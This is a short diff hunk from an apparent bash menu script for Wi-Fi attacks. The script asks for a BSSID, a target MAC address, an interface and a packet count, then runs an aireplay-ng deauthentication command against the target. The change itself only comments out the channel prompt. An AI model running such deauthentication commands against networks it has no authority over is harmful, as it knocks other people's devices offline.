@@ -71,7 +71,7 @@ read -p "Enter Bssid :# " bssid
 read -p "Enter mac Target :# " t
 read -p "Enter Intrface :# " i
 read -p "Enter number of packet :# " pack
-read -p "Enter number channel :# " c
+#read -p "Enter number channel :# " c
 sudo xterm -e aireplay-ng -0 $pack -a $bssid -c $t $i
 #
 read -p "please Enter Yor Option > " tryag
